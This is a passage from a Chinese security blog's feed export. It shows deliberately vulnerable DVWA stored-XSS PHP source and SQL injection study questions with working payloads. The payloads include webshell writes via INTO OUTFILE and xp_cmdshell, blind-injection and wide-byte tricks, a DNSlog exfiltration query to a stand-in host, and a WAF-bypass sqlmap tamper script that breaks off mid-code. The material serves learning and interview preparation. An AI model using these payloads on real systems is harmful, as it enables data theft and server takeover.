: <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//mysql_close();</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = strip_tags( addslashes( <span class=\"variable\">$message</span> ) );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = htmlspecialchars( <span class=\"variable\">$message</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = str_replace( <span class=\"string\">&#x27;&lt;script&gt;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$name</span> );</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class=\"subst\">$message</span>&#x27;, &#x27;<span class=\"subst\">$name</span>&#x27; );&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//mysql_close();</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = stripslashes( <span class=\"variable\">$message</span> );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class=\"subst\">$message</span>&#x27;, &#x27;<span class=\"subst\">$name</span>&#x27; );&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//mysql_close();</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-12\"><a class=\"markdownIt-Anchor\" href=\"#low-12\"></a> Low</h3>\n<ul>\n<li>与反射形类似</li>\n</ul>\n<h3 id=\"medium-12\"><a class=\"markdownIt-Anchor\" href=\"#medium-12\"></a> Medium</h3>\n<ul>\n<li>与反射形类似</li>\n</ul>\n<h3 id=\"high-12\"><a class=\"markdownIt-Anchor\" href=\"#high-12\"></a> High</h3>\n<ul>\n<li>与反射形类似</li>\n</ul>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL注入基础题",
            "date_published": "2021-03-28T10:39:27.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\"></a> SQL注入</h1>\n<h2 id=\"一-知识储备类\"><a class=\"markdownIt-Anchor\" href=\"#一-知识储备类\"></a> 一、知识储备类</h2>\n<h3 id=\"1sql与nosql的区别\"><a class=\"markdownIt-Anchor\" href=\"#1sql与nosql的区别\"></a> 1.SQL与NoSQL的区别？</h3>\n<p>SQL：关系型数据库</p>\n<p>NoSQL：非关系型数据库</p>\n<p>存储方式：SQL具有特定的结构表，NoSQL存储方式灵活</p>\n<p>性能：NoSQL较优于SQL</p>\n<p>数据类型：SQL适用结构化数据，如账号密码；NoSQL适用非结构化数据，如文章、评论</p>\n<h3 id=\"2常见的关系型数据库\"><a class=\"markdownIt-Anchor\" href=\"#2常见的关系型数据库\"></a> 2.常见的关系型数据库？</h3>\n<p>mysql、sqlserver、oracle、access、sqlite、postgreSQL</p>\n<h3 id=\"3常见的数据库端口\"><a class=\"markdownIt-Anchor\" href=\"#3常见的数据库端口\"></a> 3.常见的数据库端口？</h3>\n<p>关系型：</p>\n<p>mysql:3306</p>\n<p>sqlserver:1433</p>\n<p>orecal:1521</p>\n<p>PostgreSQL:5432</p>\n<p>db2:50000</p>\n<p>非关系型：</p>\n<p>MongoDB:27017</p>\n<p>redis:6379</p>\n<p>memcached:11211</p>\n<h3 id=\"4简述数据库的存储引擎\"><a class=\"markdownIt-Anchor\" href=\"#4简述数据库的存储引擎\"></a> 4.简述数据库的存储引擎</h3>\n<p>数据库存储引擎是数据库底层软件组织，数据库管理系统(DBMS)使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎，还可以获得特定的功能。</p>\n<p>InnoDB：主流的存储引擎，mysql默认存储引擎</p>\n<p>MyISAM：查询、插入速度快，不支持事务</p>\n<p>MEMORY：hash索引、BTREE索引</p>\n<h3 id=\"5sql注入有哪几种注入类型\"><a class=\"markdownIt-Anchor\" href=\"#5sql注入有哪几种注入类型\"></a> 5.SQL注入有哪几种注入类型？</h3>\n<p>从注入参数类型分：数字型注入、字符型注入、搜索型注入</p>\n<p>从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入</p>\n<p>从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入</p>\n<h3 id=\"6sql注入的危害及防御\"><a class=\"markdownIt-Anchor\" href=\"#6sql注入的危害及防御\"></a> 6.SQL注入的危害及防御？</h3>\n<p>危害：</p>\n<p>数据库泄露</p>\n<p>数据库被破坏</p>\n<p>网站崩溃</p>\n<p>服务器被植入木马</p>\n<p>防御：</p>\n<p>代码层面对查询参数进行转义</p>\n<p>预编译与参数绑定</p>\n<p>利用WAF防御</p>\n<h3 id=\"7如果存在sql注入怎么判断不同的数据库\"><a class=\"markdownIt-Anchor\" href=\"#7如果存在sql注入怎么判断不同的数据库\"></a> 7.如果存在SQL注入怎么判断不同的数据库？</h3>\n<p>根据报错信息判断</p>\n<p>根据执行函数返回的结果判断，如len()和lenth()，version()和@@version等</p>\n<p>根据注释符判断</p>\n<h3 id=\"8mysql的网站注入50以上和50以下有什么区别\"><a class=\"markdownIt-Anchor\" href=\"#8mysql的网站注入50以上和50以下有什么区别\"></a> 8.mysql的网站注入，5.0以上和5.0以下有什么区别？</h3>\n<p>从sql注入的角度来说，mysql5.0以下版本没有information_schema这个系统库，无法列出表名列名，只能暴力跑</p>\n<h3 id=\"9mysql一个和两个什么区别\"><a class=\"markdownIt-Anchor\" href=\"#9mysql一个和两个什么区别\"></a> 9.Mysql一个@和两个@什么区别</h3>\n<p>一个@是用户自定义变量</p>\n<p>两个@是系统变量，如@@version、@@user</p>\n<h3 id=\"10mysql注入绕过常用的函数\"><a class=\"markdownIt-Anchor\" href=\"#10mysql注入绕过常用的函数\"></a> 10.MYSQL注入/绕过常用的函数</h3>\n<p>注入常用函数：</p>\n<p>database() 返回当前数据库名</p>\n<p>user() 返回当前数据库用户名</p>\n<p>updatexml() 更新xml文档，常用于报错注入</p>\n<p>mid() 从指定字段中提取出字段的内容</p>\n<p>limit() 返回结果中的前几条数据或者中间的数据</p>\n<p>concat() 返回参数产生的字符串</p>\n<p>group_concat() 分组拼接函数</p>\n<p>count() 返回指定参数的数目</p>\n<p>rand() 参数0~1个随机数</p>\n<p>flood() 向下取整</p>\n<p>substr() 截取字符串</p>\n<p>ascii() 返回字符串的ascii码</p>\n<p>left() 返回字符串最左边指定个数的字符</p>\n<p>ord() 返回字符的ascii码</p>\n<p>length() 返回字符串长度</p>\n<p>sleep() 延时函数</p>\n<p>等价函数绕过，反之亦可：</p>\n<p>group_concat() ==&gt; concat_ws()</p>\n<p>sleep() ==&gt; benchmark()</p>\n<p>mid()、substr() ==&gt; substring()</p>\n<p>user() ==&gt; @@user</p>\n<p>updatexml() ==&gt; extractvalue()</p>\n<h3 id=\"11udf提权原理\"><a class=\"markdownIt-Anchor\" href=\"#11udf提权原理\"></a> 11.UDF提权原理？</h3>\n<p>mysql支持用户自定义函数，将含有自定义函数的dll放入特定的文件夹，声明引入dll中的执行函数，使用执行函数执行系统命令</p>\n<h3 id=\"12mssql差异备份原理及条件\"><a class=\"markdownIt-Anchor\" href=\"#12mssql差异备份原理及条件\"></a> 12.MSSQL差异备份原理及条件？</h3>\n<p>原理：</p>\n<p>完整备份后，再次对数据库进行修改，差异备份会记录最后的LSN，将shell写入数据库，备份成asp即可getshell</p>\n<p>条件：</p>\n<p>MSSQL具有dbo或sa权限</p>\n<p>支持堆叠查询</p>\n<p>找到网站的绝对路径</p>\n<h2 id=\"二-实操技能类\"><a class=\"markdownIt-Anchor\" href=\"#二-实操技能类\"></a> 二、实操技能类</h2>\n<h3 id=\"1sql注入写shell的条件用法\"><a class=\"markdownIt-Anchor\" href=\"#1sql注入写shell的条件用法\"></a> 1.SQL注入写shell的条件，用法</h3>\n<p>条件：</p>\n<p>当前用户具有dba权限</p>\n<p>找到网站绝对路径</p>\n<p>网站有可写目录</p>\n<p>mysql的配置secure_file_priv为空</p>\n<p>用法：</p>\n<p>mysql:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; and 1=2 union select 1,2,&#x27;</span>shell内容<span class=\"string\">&#x27; into outfile &quot;绝对路径\\shell.php&quot; %23</span></span><br></pre></td></tr></table></figure>\n<p>sqlserver:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;;EXEC master..xp_cmdshell &#x27;</span>echo &quot;shell内容&quot; <span class=\"operator\">&gt;</span> 绝对路径\\shell.asp<span class=\"string\">&#x27; --</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"2sql注入过滤了逗号怎么弄\"><a class=\"markdownIt-Anchor\" href=\"#2sql注入过滤了逗号怎么弄\"></a> 2.sql注入过滤了逗号，怎么弄?</h3>\n<p>join绕过：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> ((<span class=\"keyword\">select</span> <span class=\"number\">1</span>)A <span class=\"keyword\">join</span> (<span class=\"keyword\">select</span> <span class=\"number\">2</span>)B <span class=\"keyword\">join</span> (<span class=\"keyword\">select</span> <span class=\"number\">3</span>)C <span class=\"keyword\">join</span> (<span class=\"keyword\">select</span> group_concat(<span class=\"keyword\">user</span>(),<span class=\"string\">&#x27; &#x27;</span>,database(),<span class=\"string\">&#x27; &#x27;</span>,@<span class=\"variable\">@datadir</span>))D);</span><br></pre></td></tr></table></figure>\n<h3 id=\"3sleep被禁用后还能怎么进行sql注入\"><a class=\"markdownIt-Anchor\" href=\"#3sleep被禁用后还能怎么进行sql注入\"></a> 3.sleep被禁用后还能怎么进行sql注入</h3>\n<p>benchmark代替sleep:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> if(ascii(<span class=\"built_in\">substring</span>((database()),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">=</span><span class=\"number\">115</span>,(<span class=\"keyword\">select</span> benchmark(<span class=\"number\">10000000</span>,md5(<span class=\"number\">0x41</span>))),<span class=\"number\">1</span>) <span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<p>笛卡尔积盲注：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> ctf_test <span class=\"keyword\">where</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">SELECT</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>) <span class=\"keyword\">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C)</span><br></pre></td></tr></table></figure>\n<p>RLIKE盲注：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> flag <span class=\"keyword\">where</span> flag<span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">and</span> if(mid(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"operator\">=</span><span class=\"string\">&#x27;r&#x27;</span>,concat(rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>),rpad(<span class=\"number\">1</span>,<span class=\"number\">999999</span>,<span class=\"string\">&#x27;a&#x27;</span>)) RLIKE <span class=\"string\">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#x27;</span>,<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"4什么是宽字节注入如何操作\"><a class=\"markdownIt-Anchor\" href=\"#4什么是宽字节注入如何操作\"></a> 4.什么是宽字节注入？如何操作？</h3>\n<p>宽字节注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">当php开启gpc或者使用addslashes函数时，单引号&#x27;被加上反斜杠\\&#x27;，其中\\的URL编码为%5C，我们传入%df&#x27;，等价于%df%5C&#x27;，此时若程序的默认字符集是GBK，mysql用GBK编码时会认为%df%5C是一个宽字符縗，于是%df%5C&#x27;便等价于縗&#x27;，产生注入。</span><br></pre></td></tr></table></figure>\n<p>操作：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span>df<span class=\"string\">&#x27; and 1=2 union select 1,2,user(),4 %23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"5怎样进行盲注速度更快\"><a class=\"markdownIt-Anchor\" href=\"#5怎样进行盲注速度更快\"></a> 5.怎样进行盲注速度更快？</h3>\n<p>DNSlog盲注：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; and load_file(concat(&#x27;</span>\\\\\\\\<span class=\"string\">&#x27;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class=\"string\">&#x27; limit 1,1),&#x27;</span>.your<span class=\"operator\">-</span>dnslog.com\\\\cHr1s<span class=\"string\">&#x27;))--+</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"6什么是二次注入\"><a class=\"markdownIt-Anchor\" href=\"#6什么是二次注入\"></a> 6.什么是二次注入？</h3>\n<p>参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入。</p>\n<p>举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">注册用户名admin&#x27;#用户，传入值为admin\\&#x27;#，但是在存储数据库时值变为admin&#x27;#，此时若修改密码为123456，管理员admin密码就被修改为123456</span><br></pre></td></tr></table></figure>\n<h3 id=\"7sql注入常见的过waf方法\"><a class=\"markdownIt-Anchor\" href=\"#7sql注入常见的过waf方法\"></a> 7.sql注入常见的过WAF方法？</h3>\n<p>内联注释绕过</p>\n<p>填充大量脏数据绕过</p>\n<p>垃圾参数填充绕过</p>\n<p>改变提交方式绕过，如GET方式变为POST方式提交</p>\n<p>随机agent头绕过</p>\n<p>fuzz过滤函数，函数替换绕过</p>\n<h3 id=\"8sqlmap如何编写tamper\"><a class=\"markdownIt-Anchor\" href=\"#8sqlmap如何编写tamper\"></a> 8.sqlmap如何编写tamper？</h3>\n<p>tamper固定模板如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums import PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ <span class=\"operator\">=</span> PRIORITY.LOW</span><br><span class=\"line\"></span><br><span class=\"line\">def dependencies():</span><br><span class=\"line\"></span><br><span class=\"line\">pass</span><br><span class=\"line\"></span><br><span class=\"line\">def tamper(payload, <span class=\"operator\">*</span><span class=\"operator\">*</span>kwargs):</span><br><span class=\"line\"></span><br><span class=\"line\">pass</span><br><span class=\"line\"></span><br><span class=\"line\">PROIORITY</span><br></pre></td></tr></table></figure>\n<p>用于定义tamper优先级，当调用多个tamper时生效，优先级如下，数值越大优先级越高</p>\n<p>LOWEST = -100</p>\n<p>LOWER = -50</p>\n<p>LOW = -10</p>\n<p>NORMAL = 0</p>\n<p>HIGH = 10</p>\n<p>HIGHER = 50</p>\n<p>HIGHEST = 100</p>\n<p>dependencies</p>\n<p>用于提示用户tamper适用范围，具体代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from lib.core.enums import PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">from lib.core.common import singleTimeWarnMessage</span><br><span class=\"line\"></span><br><span class=\"line\">from lib.core.enums import DBMS</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"></span><br><span class=\"line\">def dependencies():</span><br><span class=\"line\"></span><br><span class=\"line\">singleTimeWarnMessage(&quot;过狗tamper &#x27;%s&#x27; 只针对 %s&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))</span><br></pre></td></tr></table></figure>\n<p>DBMS.MYSQL代表MYSQL，其他数据库类推</p>\n<p>Tamper</p>\n<p>tamper关键函数，用于定义过滤规则，示例代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from lib.core.enums import PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"></span><br><span class=\"line\">def tamper(payload, **kwargs):</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;AND&#x27;,&#x27;/*!29440AND*/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;ORDER&#x27;,&#x27;/*!29440order*/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;LIKE USER()&#x27;,&#x27;like (user/**/())&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;DATABASE()&#x27;,&#x27;database/*!29440*/()&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;CURRENT_USER()&#x27;,&#x27;CURRENT_USER/**/()&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;SESSION_USER()&#x27;,&#x27;SESSION_USER(%0a)&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;UNION ALL SELECT&#x27;,&#x27;union/*!29440select*/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;super_priv&#x27;,&#x27;/*!29440/**/super_priv*/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=payload.replace(&#x27;and 